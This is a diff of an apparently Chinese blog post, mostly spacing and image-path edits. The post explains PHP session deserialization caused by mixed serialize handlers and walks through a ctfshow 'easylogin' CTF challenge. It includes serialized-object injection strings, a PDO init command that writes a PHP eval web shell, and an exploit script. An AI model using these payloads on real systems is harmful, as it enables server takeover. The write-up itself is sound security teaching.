@@ -198,7 +198,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/CTF-Web-Session/" style="color: #00a596">
+                <a href="/tags/CTF-Web-Session/" style="color: #ff7d73">
                     CTF-Web Session
                 </a>
             </span>
@@ -209,14 +209,28 @@
     
     <div class="content" v-pre>
         <p>要了解Session反序列化，当然先要了解什么是session，或者说，把和session相关的几个机制都一起了解一下。</p>
+<br>
+<br>
+
+
 <h2 id="0x01-Cookie-Session"><a href="#0x01-Cookie-Session" class="headerlink" title="0x01 Cookie,Session"></a>0x01 Cookie,Session</h2><p>1.Cookie：当客户端对服务器发起HTTP请求时，服务器会对客户端进行一个Set-Cookie操作，并将其中的Name(名)和Value(值)填充</p>
 <pre><code class="html">Name:lwt
 Value:sb
 </code></pre>
 <p>客户端收到这个Cookie后就会以后发送的每一个请求都会自动附上这个Cookie，<code>这个cookie会保存在我们的客户端</code>，我们右键检查就可以查看cookie，所以cookie的缺点很明显，只要电脑被黑，cookie中的重要信息就会泄露。而且伴随着抓包的操作，cookie非常容易被篡改，从而达到伪造身份的目的。</p>
+<br>
+
 <p>2.Session：为了改善安全性问题，引入了一种新的机制session。Session一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里仅讨论<code>PHP session</code>机制。</p>
+<br>
+<br>
+
+
 <h2 id="0x02-PHP-Session的工作流程"><a href="#0x02-PHP-Session的工作流程" class="headerlink" title="0x02 PHP Session的工作流程"></a>0x02 PHP Session的工作流程</h2><p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的Cookies、Get、Post中不存在session id，PHP就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给用户端保存。</p>
+<br>
+
 <p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
+<br>
+
 <p>会话开始之后，PHP 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p>
 <pre><code class="php">&lt;?php
 session_start();
@@ -226,24 +240,31 @@ if (!isset($_SESSION[&#39;username&#39;])) &#123;
 ?&gt;
 </code></pre>
 <p>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。</p>
+<br>
+
 <p>默认情况下，<code>PHP 使用内置的文件会话保存管理器来完成session的保存，也可以通过配置项 session.save_handler 来修改所要采用的会话保存管理器。</code> 对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置。</p>
+<br>
+
 <p>整个流程大概如上所述，也可参考下述流程图：</p>
-<img src="C:\Users\12948\Desktop\20191026142328-1fba974c-f7b9-1.png" style="zoom:50%;" />
+<img src="Software\Myblog\source\images\20191026142328-1fba974c-f7b9-1.png" style="zoom:50%;">
 
-
-
-
+<br>
+<br>
 
 <h2 id="0x03-PHP-Session在php-ini中的配置"><a href="#0x03-PHP-Session在php-ini中的配置" class="headerlink" title="0x03 PHP Session在php.ini中的配置"></a>0x03 PHP Session在php.ini中的配置</h2><p>有很多配置项这里不赘述，关于session反序列化主要是其中一项：</p>
 <p><code>session.serialize_handler</code></p>
 <p>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同</p>
+<br>
+<br>
+
+
 <h2 id="0x04-PHP-Session的存储机制"><a href="#0x04-PHP-Session的存储机制" class="headerlink" title="0x04 PHP Session的存储机制"></a>0x04 PHP Session的存储机制</h2><p>上文中提到了 <code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>，如下图所示</p>
-<img src="C:\Users\12948\Desktop\20191026142528-67263294-f7b9-1.png" style="zoom:75%;" />
+<img src="Software\Myblog\source\images\20191026142528-67263294-f7b9-1.png" style="zoom:75%;">
 
 <p>当然，文件的内容始终是session值的序列化之后的内容：</p>
-<img src="C:\Users\12948\Desktop\wc.png" style="zoom:50%;" />
+<img src="Software\Myblog\source\images\wc.png" style="zoom:50%;">
 
-
+<br>
 
 <p>session.serialize_handler定义的引擎有三种，如表：</p>
 <table>
@@ -267,8 +288,12 @@ if (!isset($_SESSION[&#39;username&#39;])) &#123;
 </tr>
 </tbody></table>
 <p>上述三个处理器中，php_serialize在内部简单地使用serialize&#x2F;unserialize函数，而不会有另外两种处理器的限制如 “|”，”!”等特殊符号。</p>
+<br>
+
 <p>php提供<code>session.serialize_handler &quot;php&quot; PHP_INI_ALL</code>可以来设置以上的处理器</p>
 <p>测试的时候php版本一定要大于5.5.4(具体版本未测试,不然session写不进文件)</p>
+<br>
+
 <h3 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h3><p>当<code>session.serialize_handler=php</code>时的序列化结果，demo：</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -281,6 +306,8 @@ $_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
 ?&gt;  
 </code></pre>
 <p>可以发现，序列化的结果是一个键值对，<code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
+<br>
+
 <h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>当<code>session.serialize_handler=php_binary</code>时的序列化结果，</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -292,6 +319,8 @@ $_SESSION[&#39;sessionsessionsessionsessionsession&#39;] = $_GET[&#39;session&#3
 ?&gt;
 </code></pre>
 <p>GET提交session参数后可以发现序列化结果的键名sessionsessionsessionsessionsession前多了一个#符号，因为键名长度为35，而35对应的ascii码就是#，所以可以总结当<code>session.serialize_handler=php_binary</code>时其序列化结果会将$_SESSION[’键名’]的键名长度进行ASCII编码后放在最前面，而且键值对间的连接符号不再是 ”|” 而是  “:”</p>
+<br>
+
 <h3 id="php-serialize处理器"><a href="#php-serialize处理器" class="headerlink" title="php_serialize处理器"></a>php_serialize处理器</h3><p>最后就是<code>session.serialize_handler=php_serialize</code>时候的序列化结果，同理，demo 如下：</p>
 <pre><code class="php">&lt;?php
 error_reporting(0);
@@ -303,9 +332,14 @@ $_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
 ?&gt;
 </code></pre>
 <p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
+<br>
+
+
 <p>绝大多数情况下，造成session反序列化漏洞的原因通常是因为两种处理器混合使用，特别是php_serialize和php处理器混合使用时。</p>
 <p>简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
 <p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
+<br>
+
 <p><strong>当存储是php_serialize处理，然后调用时php去处理</strong></p>
 <p>如果这时候注入的数据是</p>
 <pre><code>a=|O:4:&quot;test&quot;:0:&#123;&#125;
@@ -317,6 +351,9 @@ $_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
 <pre><code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;
 </code></pre>
 <p>在经过php解析后是被看成键名,后面就是一个实例化test对象的注入</p>
+<br>
+
+
 <p>构造两个php文件，其中一个a.php的session处理器使用php_serialize，另一个b.php使用php。</p>
 <pre><code class="php">&lt;?php
 ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
@@ -343,6 +380,10 @@ class lemon&#123;
 <p>当我们先访问a.php，并传参a&#x3D;|O:5:”lemon”:1:{s:2:”hi”;s:3:”lwt”;}</p>
 <p>此时session文件中就会有一个数组的序列化字符串，但是中间多一个 ”|”</p>
 <p>然后我们再访问b.php就会执行代码输出hilwt，上面序列化字符串是先实例化lemon对象，同时将$hi&#x3D;lwt，序列化该对象，传参时前面加一个 ”|” 就可以让php处理器认为是键值对中的值，因此在反序列化session数据时是将 ”|” 后面的字符串反序列化，此时就会触发destruct和wakeup输出”hilwt“</p>
+<br>
+<br>
+
+
 <h3 id="0x05-例题：ctfshow元旦水友赛Web-easylogin"><a href="#0x05-例题：ctfshow元旦水友赛Web-easylogin" class="headerlink" title="0x05 例题：ctfshow元旦水友赛Web-easylogin"></a>0x05 例题：ctfshow元旦水友赛Web-easylogin</h3><p>其实是道原题，但是当时没刷到。</p>
 <p>开题给源码，两个附件，先看common.php，不难发现userLogger类有写入文件的操作file_put_contents()</p>
 <pre><code class="php">       public function user_register($username,$password)&#123;
@@ -370,6 +411,8 @@ class lemon&#123;
     &#125;
 </code></pre>
 <p>application类中可以发现有一个去session里面取数据解码的操作，学过session反序列化就会知道存储于session的数据都是序列化后的字符串，解码取出时就会进行反序列化操作，所以我们可以通过这一段进行反序列化攻击。</p>
+<br>
+
 <p>语句</p>
 <pre><code>session_decode($_GET[&#39;token&#39;]);
 </code></pre>
@@ -379,6 +422,8 @@ class lemon&#123;
 </code></pre>
 <p><code>往session里面拿取对象，拿取名字为user的对象。</code></p>
 <p><code>我们就可以通过构造token=user|”恶意序列化字符串“来getshell</code></p>
+<br>
+
 <p>往上反推，我们需要调用getloginname方法的地方，再看到&#x2F;templates&#x2F;main.php路由，调用了getloginname方法</p>
 <pre><code class="php">&lt;?php
 
@@ -426,6 +471,8 @@ if(isset($action))&#123;
     &#125;
 </code></pre>
 <p><code>GET方法传一个action，经过switch检测，只要不是”do_login”,”logout”,”do_register”这三个值的其中一个</code>，就会跳转至main.php，而且session_start也证明了存在session反序列化的可能</p>
+<br>
+
 <p>我们需要实现写入，那就要进入if语句的判断<code>if($data === NULL &amp;&amp; isset($_GET[&#39;token&#39;]))</code>，我们追踪<code>$data === NULL</code>，可以看到cookie_helper类</p>
 <pre><code class="php">class cookie_helper&#123;
     private $secret = &quot;*************&quot;; //敏感信息打码
@@ -446,7 +493,11 @@ if(isset($action))&#123;
             return null;
         &#125;
 </code></pre>
+<br>
+
 <p>我们注册使用的name会被set_cookie返回一个cookie存储于浏览器，我们下次还想用注册的账号登录那么发包的时候就要带上这个cookie值。此时verify()方法中用“|”把cookie值隔开，判断数量是否为2，如果不为2返回null（关键点在这）<code>因此只需要我们注册时的name带上”|”，服务器给我们set_cookie时就可以生成带有“|”的cookie，带上这个cookie发包时就可以通过verify()检测返回data的值为null</code></p>
+<br>
+
 <p>后面连接数据库的操作关乎另一个sql的知识点在这不赘述</p>
 <p>利用PDO::MYSQL_ATTR_INIT_COMMAND</p>
 <pre><code>连接MySQL服务器时执行的命令（SQL语句）。将在重新连接时自动重新执行。注意，这个常量只能在构造一个新的数据库句柄时在driver_options数组中使用。
@@ -485,6 +536,8 @@ PDO::MYSQL_ATTR_INIT_COMMAND =&gt; “select &#39;&lt;?php eval($_POST[1]);phpin
 &#125;
 </code></pre>
 <p>最后还要注意debug赋值为true才能进if连接数据库就得执行mysql_helper::get_pdo()方法，然后必须执行application::log_last_user()方法</p>
+<br>
+
 <p>最后贴上z3r4y师傅的exp如下</p>
 <pre><code class="php">&lt;?php
 session_start();
@@ -509,13 +562,23 @@ $a = new application();
 echo urlencode(serialize($a));
 </code></pre>
 <p>反序列化的操作先到这里</p>
+<br>
+
 <p>具体操作就是先注册名称带有”|”账号，抓包得到服务器端响应的Set-Cookie，后续发包都要带上cookie，GET传参action&#x3D;wtf(不等于那三个值就行)&amp;token&#x3D;user|序列化字符串，将🐎传上去后就可以访问1.php得到flag</p>
+<br>
+<br>
+
+
 <h2 id="常用的防御方法"><a href="#常用的防御方法" class="headerlink" title="常用的防御方法"></a>常用的防御方法</h2><ul>
 <li><p>尽量避免出现混合使用不同session处理器的情况</p>
 </li>
 <li><p>严格控制数据输入</p>
 </li>
 </ul>
+<br>
+<br>
+
+
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h2><ul>
 <li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html#2-php_session%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98">https://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html#2-php_session序列化及反序列化问题</a></p>
 </li>
